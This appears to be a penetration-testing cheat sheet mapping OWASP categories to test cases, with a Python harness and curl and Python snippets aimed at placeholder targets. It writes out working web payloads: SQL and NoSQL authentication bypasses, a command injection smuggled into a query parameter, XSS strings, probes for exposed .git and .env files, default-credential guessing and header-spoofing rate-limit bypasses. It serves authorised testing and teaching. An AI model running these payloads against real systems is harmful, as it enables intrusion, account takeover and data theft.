# Penetration Testing — Test Cases & OWASP Coverage

## Test Harness

```python
class PenetrationTest:
    def __init__(self, target_url, scope):
        self.target = target_url
        self.scope = scope
        self.findings = []

    def execute_test_case(self, test_name, attack_payload, validation_fn):
        try:
            response = self.send_request(attack_payload)
            if validation_fn(response):
                finding = {"test": test_name, "evidence": response.text[:500]}
                self.findings.append(finding)
                return True
        except Exception as e:
            print(f"Test {test_name} failed: {e}")
        return False
```

```bash
#!/bin/bash
TARGET="https://target.example.com"
FINDINGS_LOG="findings.log"

./tests/auth_tests.sh "$TARGET" >> "$FINDINGS_LOG"
./tests/authz_tests.sh "$TARGET" >> "$FINDINGS_LOG"
./tests/input_tests.sh "$TARGET" >> "$FINDINGS_LOG"
```

## Authentication & Session Management (A07)

| Test | Payload | Finding Condition |
|---|---|---|
| Weak password policy | Register with `pass123` | Account created |
| Session fixation | Capture session ID pre-login, use post-login | Same ID persists |
| No reset token expiry | Use old reset token after 30 days | Still valid |

```bash
# Test password policy
curl -X POST https://target.com/register \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"123"}' \
  | grep -i "password too weak"
# If no error → weak policy finding
```

## Authorization & Access Control (A01)

```python
def test_bola(target_url, session):
    """Broken Object Level Authorization."""
    for uid in [1, 2, 3, 4, 5]:
        resp = session.get(f"{target_url}/users/{uid}/profile")
        if resp.status_code == 200:
            data = resp.json()
            if data.get("username") != get_current_username():
                return {"vulnerability": "BOLA", "endpoint": f"/users/{uid}/profile",
                        "severity": "HIGH"}
    return None
```

**Privilege escalation test:**

```yaml
Login as regular user
  → GET /admin/dashboard, /admin/users
  → If 200 with data → privilege escalation finding
```

## Injection Attacks (A03)

```bash
# SQL Injection
curl -X POST https://target.com/login \
  -d "username=admin' --&password=anything"
# Look for SQL errors or unexpected 200 response

# Command Injection
curl "https://target.com/ping?host=google.com;whoami"
# Look for command output in response body
```

```python
# NoSQL Injection (MongoDB)
payload = {"username": {"$ne": ""}, "password": {"$ne": ""}}
resp = requests.post("https://target.com/api/login", json=payload)
# If 200 → authentication bypass
```

## Cross-Site Scripting (A03)

```bash
# Reflected XSS
curl "https://target.com/search?q=<script>alert('XSS')</script>"
# Check if unescaped script appears in response HTML
```

```python
# Stored XSS
requests.post("https://target.com/comments",
              data={"comment": "<img src=x onerror=alert('XSS')>"})
resp = requests.get("https://target.com/comments")
if "<img src=x onerror=alert" in resp.text:
    print("Stored XSS confirmed")
```

## Security Misconfiguration (A05)

```bash
# Exposed paths
for path in /.git /.env /admin /debug /phpinfo.php; do
  curl -I "https://target.com$path"
done

# Default credentials
for cred in "admin:admin" "root:password" "postgres:postgres"; do
  user="${cred%%:*}"; pass="${cred##*:}"
  curl -s -o /dev/null -w "%{http_code}" -X POST https://target.com/api/login \
    -d "{\"username\":\"$user\",\"password\":\"$pass\"}"
done
```

## Web Application Testing

### Cookie Security

```python
cookies = response.headers.getlist("Set-Cookie")
for cookie in cookies:
    if "HttpOnly" not in cookie:
        print(f"Missing HttpOnly flag: {cookie}")
    if "Secure" not in cookie:
        print(f"Missing Secure flag: {cookie}")
    if "SameSite" not in cookie:
        print(f"Missing SameSite: {cookie}")
```

### CORS Misconfiguration

```bash
curl -I -H "Origin: https://attacker.com" https://target.com/api/data
# If Access-Control-Allow-Origin: * → finding
```

### Rate Limiting Bypass

```python
bypass_headers = ["X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Client-IP"]

for header in bypass_headers:
    for i in range(100):
        resp = requests.post(endpoint, headers={header: "127.0.0.1"})
        if resp.status_code != 429:
            print(f"Rate limit bypass via {header}")
            break
```
